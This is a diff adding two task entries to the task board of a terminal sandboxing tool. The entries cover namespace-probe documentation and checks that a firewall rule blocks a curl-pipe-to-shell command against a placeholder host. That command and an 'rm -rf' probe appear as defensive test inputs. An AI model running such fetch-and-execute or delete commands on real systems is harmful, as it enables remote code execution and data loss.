@@ -636,3 +636,40 @@ tasks:
   status: complete
   created_at: '2026-09-15T11:20:06.084479+00:00'
   completed_at: '2026-09-15T12:05:00.032846+00:00'
+- id: TJ-DF-017
+  title: Branch quickstart/skill verify flow on the pidns capability probe (FULL vs
+    DEGRADED)
+  criteria:
+  - grep -n pidns-capability-probe docs/quickstart.md shows >=1 hit inside the section
+    3a verify block
+  - quickstart 3a has an explicit FULL branch (bare mode + readlink /proc/self/ns/pid
+    differs from host) and a DEGRADED branch stating what --user does and does not
+    contain
+  - grep -n pidns-capability-probe skills/terminal-jail-usage/SKILL.md shows >=1 hit
+    in the Quick start block and the --user echo line no longer implies containment
+    by itself
+  - every command in the changed doc regions runs verbatim on this host with the documented
+    result
+  - uvx ruff check . exits 0 and .venv/bin/python -m pytest plugin -q stays at 348
+    passed/14 skipped
+  status: complete
+  created_at: '2026-09-15T18:15:09.771618+00:00'
+  completed_at: '2026-09-15T18:18:38.077996+00:00'
+- id: TJ-DF-016
+  title: "Premise-false verification: warn mode on DEGRADED hosts does NOT die silent\
+    \ \u2014 firewall verdict prints before the namespace failure"
+  criteria:
+  - plugin/terminal_jail/interruptor_bridge.py returns action=block rule_id=builtin-curl-pipe-shell
+    for 'curl -s http://example.invalid | sh' and action=allow with empty rule_id
+    for 'rm -rf /tmp/tj-probe-016'
+  - 'standalone/terminal-jail evaluates the interruptor (firewall) block BEFORE the
+    namespace preflight: the WARN line appears on stderr ahead of the namespace-failure
+    line'
+  - 'live: TERMINAL_JAIL_INTERRUPTOR_MODE=warn <cli> bash -c ''curl -s http://example.invalid
+    | sh'' prints ''WARNING - [WARN MODE] Would have blocked'' on stderr on this DEGRADED
+    host (grep count 1) and the command is not run (rc=2)'
+  - 'live control: the same command in enforce mode exits 126 with the COMMAND BLOCKED
+    box and rule builtin-curl-pipe-shell'
+  - "no repository code change is claimed \u2014 board-only premise closure"
+  status: in_progress
+  created_at: '2026-09-15T18:15:34.095339+00:00'
